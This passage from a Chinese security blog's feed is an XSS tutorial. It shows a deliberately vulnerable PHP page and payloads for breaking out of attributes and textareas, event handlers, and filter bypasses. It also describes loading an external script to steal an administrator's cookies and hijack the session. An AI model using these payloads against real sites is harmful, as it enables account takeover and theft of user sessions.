class=&quot;attr&quot;&gt;content&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text/html; charset=utf-8&quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;XSS利用输出的环境来构造代码&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;title&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;head&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;h6&lt;/span&gt;&amp;gt;&lt;/span&gt;把我们输入的字符串 输出到input里的value属性里&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;h6&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;form&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;action&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;method&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;get&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;h6&lt;/span&gt;&amp;gt;&lt;/span&gt;请输入你想显现的字符串&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;h6&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;name&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;xss_input_value&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;value&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;输入&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;br&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;type&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;submit&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;form&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;hr&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            $xss = $_GET[&#39;xss_input_value&#39;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            if(isset($xss))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                echo &#39;&amp;lt;input type=&quot;text&quot; value=&quot;&#39;.$xss.&#39;&quot;&amp;gt;&#39;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;else&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                echo &#39;&amp;lt;input type=&quot;type&quot; value=&quot;输出&quot;&amp;gt;&#39;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;center&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;body&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;html&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;下面是代码的页面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/EeVT32.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入1，那么第二个input里的value值就是1，下面是页面的截图和源代码的截图(这里我输入&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;来测试)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/1h5YdR.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/vwP031.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;明显的可以看到，并没有弹出对话框，大家可能会疑惑为什么没有弹窗呢，我们来看看源代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/QJtpQo.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们看到我们输入的字符串被输出到第15行input标签里的value属性里面，被当成value里的值来显现出来，所以并没有弹窗，这时候我们该怎么办呢？聪明的人已经发现了可以在&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;前面加个&lt;code&gt;&amp;quot;&amp;gt;&lt;/code&gt;来闭合input标签。所以应该得到的结果为&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/UHREw4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;成功弹窗了，我们在看看这时的页面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/flfTcb.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;看到后面有第二个input输入框后面跟有”&amp;gt;字符串，为什么会这样呢，我们来看看源代码&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/uvuo5i.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这时可以看到我们构造的代码里面有两个&lt;code&gt;&amp;quot;&amp;gt;&lt;/code&gt;，第一个”&amp;gt;是为了闭合input标签，所以第二个&lt;code&gt;&amp;quot;&amp;gt;&lt;/code&gt;就被抛弃了，因为html的容错性高，所以并没有像php那样出现错误，而是直接把多余的字符串来输出了，有的人是个完美主义者，不喜欢有多余的字符串被输出，这时该怎么办呢？&lt;/p&gt;
&lt;p&gt;这里我问大家一个问题，我之前说的xss代码里，为什么全是带有标签的。难道就不能不带标签么？！答：当然可以。既然可以不用标签，那我们就用标签里的属性来构造XSS，这样的话，xss代码又少，又不会有多余的字符串被输出来。&lt;/p&gt;
&lt;p&gt;还是这个环境，但是不能使用标签，你应该怎么做。想想input里有什么属性可以调用js，html学的好的人，应该知道了，on事件，对的。我们可以用on事件来进行弹窗，比如这个xss代码 我们可以写成&lt;code&gt;&amp;quot; onclick=&amp;quot;alert(&amp;#39;xss&amp;#39;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这时，我们在来试试，页面会发生什么样的变化吧。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/tgdkGA.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;没有看到弹窗啊，失败了么？答案当然是错误的，因为onclick是鼠标点击事件，也就是说当你的鼠标点击第二个input输入框的时候，就会触发onclick事件，然后执行&lt;code&gt;alert(&amp;#39;xss&amp;#39;)&lt;/code&gt;代码。我们来试试看&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/gcQF2g.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;当我点击后，就出现了弹窗，这时我们来看看源代码把&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/wq0ht7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;第15行，value值为空，当鼠标点击时，就会弹出对话框。这里可能就会有人问了，如果要点击才会触发，那不是很麻烦么，成功率不就又下降了么。我来帮你解答这个问题，on事件不止onclick这一个，还有很多，如果你想不需要用户完成什么动作就可以触发的话，i可以把onclick改成&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;onmousemove 当鼠标移动就触发&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;onload 当页面加载完成后触发&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;还有很多，我这里就不一一说明了，有兴趣的朋友可以自行查询下。&lt;/p&gt;
&lt;p&gt;别以为就这样结束了，还有一类环境不能用上述的方法，&lt;/p&gt;
&lt;p&gt;那就是如果在&lt;code&gt;&amp;lt;textarea&amp;gt;&lt;/code&gt;标签里呢？！或者其他优先级比script高的呢？&lt;/p&gt;
&lt;p&gt;就下面这样&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.niupic.com/images/2016/05/30/xYdH4Z.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这时我们该怎么办呢？既然前面都说了闭合属性和闭合标签了，那能不能闭合完整的标签呢，答案是肯定的。我们可以输入&lt;code&gt;&amp;lt;/textarea&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;)&amp;lt;/script&amp;gt;&lt;/code&gt;就可以实现弹窗了。&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0×04-过滤的解决办法&quot;&gt;&lt;a href=&quot;#0×04-过滤的解决办法&quot; class=&quot;headerlink&quot; title=&quot;0×04 过滤的解决办法:&quot;&gt;&lt;/a&gt;0×04 过滤的解决办法:&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;假如说网站禁止过滤了script 这时该怎么办呢，记住一句话，这是我总结出来的“xss就是在页面执行你想要的js”不用管那么多，只要能运行我们的js就OK，比如用img标签或者a标签。我们可以这样写&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;scr&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;onerror&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;alert(&lt;/span&gt;&#39;&lt;span class=&quot;attr&quot;&gt;xss&lt;/span&gt;&#39;)&amp;gt;&lt;/span&gt; 当找不到图片名为1的文件时，执行alert(&#39;xss&#39;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;href&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;javascrip:alert(&lt;/span&gt;&#39;&lt;span class=&quot;attr&quot;&gt;xss&lt;/span&gt;&#39;)&amp;gt;&lt;/span&gt;s&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;a&lt;/span&gt;&amp;gt;&lt;/span&gt; 点击s时运行alert(&#39;xss&#39;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;iframe&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;javascript:alert(&lt;/span&gt;&#39;&lt;span class=&quot;attr&quot;&gt;xss&lt;/span&gt;&#39;);&lt;span class=&quot;attr&quot;&gt;height&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;width&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;0&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;iframe&lt;/span&gt;&amp;gt;&lt;/span&gt; 利用iframe的scr来弹窗&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;onerror&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;eval(&lt;/span&gt;&quot;\&lt;span class=&quot;attr&quot;&gt;x61&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x6c&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x65&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x72&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x74&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x28&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x27&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x78&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x73&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x73&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x27&lt;/span&gt;\&lt;span class=&quot;attr&quot;&gt;x29&lt;/span&gt;&quot;)&amp;gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt;&amp;gt;&lt;/span&gt; 过滤了alert来执行弹窗&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;等等有很多的方法，不要把思想总局限于一种上面，记住一句话“xss就是在页面执行你想要的js”其他的管他去。(当然有的时候还要管他…)&lt;/p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;0×05-xss的利用&quot;&gt;&lt;a href=&quot;#0×05-xss的利用&quot; class=&quot;headerlink&quot; title=&quot;0×05 xss的利用:&quot;&gt;&lt;/a&gt;0×05 xss的利用:&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;说了那么多，大家可能都以为xss就是弹窗，其实错了，弹窗只是测试xss的存在性和使用性。&lt;/p&gt;
&lt;p&gt;这时我们要插入js代码了，怎么插呢？&lt;/p&gt;
&lt;p&gt;你可以这样&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;scr&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;js_url&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;undefined&quot;&gt;&lt;/span&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;也可以这样&lt;br&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;onerror&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;appendChild(createElement(&lt;/span&gt;&#39;&lt;span class=&quot;attr&quot;&gt;script&lt;/span&gt;&#39;))&lt;span class=&quot;attr&quot;&gt;.src&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&#39;js_url&#39;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;各种姿势，各种插，只要鞥运行我们的js就OK。那运行我们的js有什么用呢？&lt;/p&gt;
&lt;p&gt;Js可以干很多的事，可以获取cookies(对http-only没用)、控制用户的动作(发帖、私信什么的)等等。&lt;/p&gt;
&lt;p&gt;比如我们在网站的留言区输入&lt;code&gt;&amp;lt;script scr=&amp;quot;js_url&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;当管理员进后台浏览留言的时候，就会触发，然后管理员的cookies和后台地址还有管理员浏览器版本等等你都可以获取到了，再用“桂林老兵cookie欺骗工具”来更改你的cookies，就可以不用输入账号 密码 验证码 就可以以管理员的方式来进行登录了。&lt;/p&gt;
&lt;p&gt;至于不会js的怎么写js代码呢，放心网上有很多xss平台，百度一下就可以看到了。页面是傻瓜式的操作，这里就不再过多的说明了。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;h3 id=&quot;0×01-前言&quot;&gt;&lt;a href=&quot;#0×01-前言&quot; class=&quot;headerlink&quot; title=&quot;0×01 前言:&quot;&gt;&lt;/a&gt;0×01 前言:&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;《xss攻击手法》一开始在互联网上资料并不多(都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲WEB安全》和cn4rry的《XSS跨站脚本攻击剖析与防御》才开始好转。&lt;/p&gt;
&lt;p&gt;我这里就不说什么xss的历史什么东西了，xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;耗时间&lt;/li&gt;
&lt;li&gt;有一定几率不成功&lt;/li&gt;
&lt;li&gt;没有相应的软件来完成自动化攻击&lt;/li&gt;
&lt;li&gt;前期需要基本的html、js功底，后期需要扎实的html、js、actionscript2/3.0等语言的功底&lt;/li&gt;
&lt;li&gt;是一种被动的攻击手法&lt;/li&gt;
&lt;li&gt;对website有http-only、crossdomian.xml没有用&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bugs.cc/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>第一篇博文</title>
    <link href="http://bugs.cc/2016/05/28/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E6%96%87/"/>
    <id>http://bugs.cc/2016/05/28/第一篇博文/</id>
    <published>2016-05-28T14:35:25.906Z</published>
    <updated>2016-05-29T14:36:40.547Z</updated>
    
    <content type="html">&lt;p&gt;我从事互联网有六个年头了，这个算是我第一个Blog吧，之前一直以“没时间”的借口来安慰自己。现在想好好的总结这六年来的点点滴滴了。也为了以后可以更好的发布自己的见解、文章、工具等。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;我从事互联网有六个年头了，这个算是我第一个Blog吧，之前一直以“没时间”的借口来安慰自己。现在想好好的总结这六年来的点点滴滴了。也为了以后可以更好的发布自己的见解、文章、工具等。&lt;/p&gt;

    
    </summary>
    
    
      <category term="随笔" scheme="http://bugs.cc/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
